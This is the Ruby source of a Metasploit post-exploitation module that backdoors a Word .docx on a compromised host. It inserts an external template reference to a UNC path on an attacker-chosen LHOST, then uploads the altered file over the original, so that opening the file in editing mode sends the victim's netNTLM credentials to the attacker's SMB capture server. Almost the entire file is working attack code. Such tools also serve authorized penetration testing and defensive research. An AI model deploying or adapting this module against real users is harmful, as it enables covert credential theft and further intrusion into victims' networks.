##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://Metasploit.com/projects/Framework/
##

require 'msf/core'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Word UNC Path Injector',
			'Description'    => %q{
					This module modifies a remote .docx file that will, upon opening, submit all
					stored netNTLM credentials to a remote host. If emailed the receiver needs
					to put the document in editing mode before the remote server will be
					contacted. Preview and read-only mode do not work. Verified to work
					with Microsoft Word 2003, 2007 and 2010 as of Januari 2013 date by using
					auxiliary/server/capture/smb
			},
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1 $',
			'References'     =>
			[
				[ 'URL', 'http://jedicorp.com/?p=534' ],
			],
			'Platform'	=> ['win', 'linux', 'unix' ],
			'SessionTypes'	=> ['meterpreter'],
			'Author'         =>
			[
				'SphaZ <cyberphaz[at]gmail.com>'
			]
		))
			register_options(
				[
					OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to','']),
					OptString.new('FILE', [true, 'Remote file to inject UNC path into. ', '']),
					OptPath.new('DSTPATH', [true, 'Path to put downloaded documents', '/tmp']),
					OptBool.new('RMLOCAL', [true, 'Delete original file after upload.', 'False']),
				], self.class)
	end

	def manipulateFile
		ref = "<w:attachedTemplate r:id=\"rId1\"/>"

		relsFileData = ""
		relsFileData << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
		relsFileData << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
		relsFileData << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
		relsFileData << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"

		fileContent = getFileFromDocx("word/settings.xml")
		if fileContent.nil?
			return nil
		end

		#First, we want to know if the reference to the template already exists..if it does we dont need to manipulate it :)
		if not fileContent.index("w:attachedTemplate r:id=\"rId1\"").nil?
			vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
			if unzipDocx.nil?
				return nil
			end
			#and we put just our rels file into the docx
			updateDocxFile("word/_rels/settings.xml.rels", relsFileData)

			#ok we got through this, lets zip the file, overwriting the original in this case
			begin
				File.delete(@localFile)
				if zipDocx(@tmpDir, @localFile).nil?
					return nil
				end
			rescue
				print_error("Can't modify the original document :(")
				return nil
			end
		else
			#now insert the reference to the file that will enable our malicious entry
			insertOne = fileContent.index("<w:defaultTabStop")

			if insertOne.nil?
				insertTwo = fileContent.index("<w:hyphenationZone") # 2nd choice
				if not insertTwo.nil?
					vprint_status("HypenationZone found, we use this for insertion.")
					fileContent.insert(insertTwo, ref )
				end
			else
				vprint_status("DefaultTabStop found, we use this for insertion.")
				fileContent.insert(insertOne, ref )
			end

			if insertOne.nil? && insertTwo.nil?
				vprint_error("Cannot find insert point for reference into settings.xml")
				return nil
			end

			if unzipDocx.nil?
				return nil
			end
			#update the settings.xml file
			if updateDocxFile("word/settings.xml",fileContent).nil?
				return nil
			end
			#and we put our rels file into the docx
			if updateDocxFile("word/_rels/settings.xml.rels", relsFileData).nil?
				return nil
			end

			#ok we got through this, lets zip the file, overwriting the tmp copy in this case
			begin
				File.delete(@localFile)
				if zipDocx(@tmpDir, @localFile).nil?
					return nil
				end
			rescue
				print_error("Can't modify the original document :(")
				return nil
			end
		end
		return 0
	end

	def zipDocx(inputPath, archive)
		begin
			#add the prepared files to the zip file
			Zip::ZipFile.open(archive, 'wb') do |fileZip|
				Dir["#{inputPath}/**/**"].reject{|f|f==archive}.each do |file|
					fileZip.add(file.sub(inputPath+'/',''), file)
				end
				relsFile = inputPath + '/_rels/.rels'
				fileZip.add(relsFile.sub(inputPath+'/',''), relsFile)
			end
		rescue
			print_error("Error zipping file..")
			begin
				FileUtils.rm_rf(inputPath)
			rescue
				print_error("Cant even clean up my own mess, I give up")
				return nil
			end
			return nil
		end
		begin
			FileUtils.rm_rf(inputPath)
		rescue
			print_error("Cant even clean up my own mess, I give up")
			return nil
		end
		return 0
	end

	def unzipDocx
		begin
			vprint_status("tmpdir: #{@tmpDir}")
			if not File.directory?(@tmpDir)
				vprint_status("Damn rubyzip cant be relied upon, so we do it the hard way. Extracting #{@localFile}")
				Zip::ZipFile.open(@localFile)  do |fileZip|
					fileZip.each do |entry|
						if not entry.nil?
							vprint_status("extracting entry: #{entry.name}")
						end
						fpath = File.join(@tmpDir, entry.name)
						FileUtils.mkdir_p(File.dirname(fpath))
						fileZip.extract(entry, fpath)
					end
				end
			end
			vprint_status("files extracted from zip")
		rescue Exception => ex
			print_error("There was an error unzipping, is the file corrupt?")
			return nil
		end
		return 0
	end

	#used for updating the files inside the docx from a string
	def updateDocxFile(fileString, content)
		begin
			#ok so now we unpacked the docx file, lets start to update the file we need to do
			#does the file already exist?
			archive = File.join(@tmpDir, fileString)
			vprint_status("We need to look for: #{archive}")
			if File.exists?(archive)
				vprint_status("Deleting original file #{archive}")
				File.delete(archive)
			end
			#now lets put OUR file there
			File.open(archive, 'wb+') { |f| f.write(content) }
		rescue Exception => ex
			print_error("Extracting and manipulating the file went wrong.")
			return nil
		end
		return 0
	end

	def getFile
		begin
			data = ""
			docxFile = session.fs.file.new("#{datastore['FILE']}", 'rb')
			until docxFile.eof?
				data << docxFile.read
			end

			if data == ""
				print_error("File read is empty!")
				return nil
			end

			orgFilename = File.join(datastore['DSTPATH'], session.fs.file.basename(datastore['FILE']))
			lclFile = File.new(orgFilename, 'wb+')
			lclFile.write(data)
			lclFile.close

			if not File.exists?(orgFilename)
				print_error("Could not create file :(")
				raise $!
			else
				vprint_status("Created local file #{orgFilename}")
			end

			#now lets make a copy for manipulation
			tmpFile = File.join("#{orgFilename}.tmp")
			FileUtils.cp(orgFilename,  tmpFile)
			vprint_status("Created file to inject into: #{tmpFile}")
			return tmpFile
		rescue
			print_error("Failed to get file or create copy for #{filename} to #{orgFilename}: #{e.class} #{e}")
			return nil
		end
	end


	#read a file from .docx into a string
	def getFileFromDocx(fileString)
		begin
			Zip::ZipFile.open(@localFile) do |zipFile|
				zipFile.each do |f|
					next unless f.to_s == fileString
					return f.get_input_stream.read
				end
			end
			print_error("Cant find #{fileString} inside the .docx")
			return nil
		rescue
			print_error("Unknown error reading docx file.")
			return nil
		end
	end


	def run
		#where do we unpack our file?
		@tmpDir = "#{Dir.tmpdir}/#{Time.now.to_i}#{rand(1000)}/"
		begin
			if not session.fs.file.exists?(datastore['FILE'])
				print_error("File not found.")
				return
			else
				@localFile = getFile
				if not @localFile.nil?
					print_status("File found and data read, lets to do some magic...")
				else
					#since nil value is from the rescue and already prints info, we just exit the module here
					return
				end
			end
		rescue
			print_error("Session error verifying file existance.")
			return
		end

		if manipulateFile.nil?
			print_error("Error manipulating #{@localFile}!")
			return
		end

		vprint_status("UNC path injected into file, lets upload it now...")
		#aight, now we need to upload and replace the file we just read
		#now we upload our modified docx.tmp file, overwriting the original on the remote host
		begin
			print_status("Uploading injected file #{@localFile} to remote #{datastore['FILE']}...")
			session.fs.file.upload_file(datastore['FILE'], @localFile)
			vprint_good("File succesfully uploaded!")
		rescue ::Exception => e
			print_error("Error uploading file #{@localFile} to #{datastore['FILE']}: #{e.class} #{e}")
			return
		end

		#cleanup phase
		begin
			vprint_status("Deleting local injected file #{@localFile}")
			File.delete(@localFile)
		rescue
			print_error("Error deleting temporary file #{@localFile}")
			return
		end

		#do we need to delete the original too?
		if datastore['RMLOCAL']
			begin
				vprint_status("Deleting original file...")
				orgFilename = File.join(datastore['DSTPATH'], session.fs.file.basename(datastore['FILE']) )
				File.delete(orgFilename)
			rescue
				print_error("Error deleting #{session.fs.file.basename(datastore['FILE'])} from #{datastore['DSTPATH']}")
				return
			end
		elsif not datastore['RMLOCAL']
			print_status("!!Keeping original of #{datastore['FILE']} in #{datastore['DSTPATH']}")
		end

		print_good("File #{datastore['FILE']} succesfully injected to point to #{datastore['LHOST']}")
	end
end
